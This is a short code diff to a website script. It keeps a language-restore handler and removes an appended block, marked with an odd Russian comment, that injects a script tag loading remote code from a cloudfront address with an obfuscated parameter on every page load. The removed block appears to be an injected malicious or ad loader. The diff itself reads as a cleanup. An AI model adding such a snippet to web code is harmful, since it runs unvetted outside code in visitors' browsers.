@@ -42,10 +42,3 @@ document.addEventListener('DOMContentLoaded', () => {
     const savedLang = localStorage.getItem('language') || 'en';
     setLanguage(savedLang);
 });
- // бурмалда
-(function() {
-  var s = document.createElement('script');
-  s.setAttribute('data-cfasync', 'false');
-  s.src = '//d2fxbo429dllho.cloudfront.net/?obxfd=1289297';
-  document.head.appendChild(s);
-})();
